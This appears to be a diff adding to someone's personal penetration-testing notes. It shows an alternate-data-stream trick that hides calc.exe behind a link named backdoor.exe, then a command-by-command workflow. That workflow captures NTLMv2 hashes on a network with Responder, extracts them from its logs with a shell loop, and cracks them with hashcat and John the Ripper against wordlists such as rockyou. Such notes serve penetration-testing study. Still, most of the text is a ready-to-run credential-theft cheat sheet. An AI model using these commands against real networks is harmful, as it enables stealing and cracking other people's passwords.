@@ -34,3 +34,40 @@ Procedure
 	mklink backdoor.exe readme.txt:calc.exe
 	backdoor.exe
 		calc would be opened,backdoor is just name of link it will open calc.exe in readme file
+		
+https://cornerpirate.com/2021/06/17/grabbing-ntlm-hashes-with-responder-then-what/
+
+responder -I <interface>
+responder -I eth0
+/usr/share/responder/logs
+SMB-NTLMv2-SSP-<ip>.txt
+
+strings Responder-Session.log | grep "NTLMv2-SSP Hash" | cut -d ":" -f 4-6 | sort -u -f | awk '{$1=$1};1'
+
+for user in `strings Responder-Session.log | grep "NTLMv2-SSP Hash" | cut -d ":" -f 4-6 | sort -u -f | awk '{$1=$1};1'`
+do
+echo "[*] search for: $user";
+strings Responder-Session.log | grep "NTLMv2-SSP Hash" | grep -i $user | cut -d ":" -f 4-10 |  head -n 1 | awk '{$1=$1};1' >> ntlm-hashes.txt
+done
+
+hashcat64.exe -m 5600 <hashes file> <wordlist> -o <output file>
+hashcat64.exe -m 5600 ntlm-hashes.txt Rocktastic12a -o cracked.txt
+john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt
+
+https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4
+https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
+
+john --wordlist=wordlist.txt --format=netntlmv2 hash.txt
+hashcat -m 5600 -a 3 hash.txt
+ hashcat -m 5600 administrator-ntlmv2 /usr/share/wordlists/rockyou.txt  --force
+ -a (attack mode)
+
+https://hashcat.net/wiki/doku.php?id=example_hashes
+ hashcat -m 0 -a 0 -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt
+ 
+ -m 0 designates the type of hash we are cracking (MD5)
+-a 0 designates a dictionary attack
+-o cracked.txt is the output file for the cracked passwords
+target_hashes.txt is our input file of hashes
+/usr/share/wordlists/rockyou.txt is the absolute path to the wordlist file for this dictionary attack
+
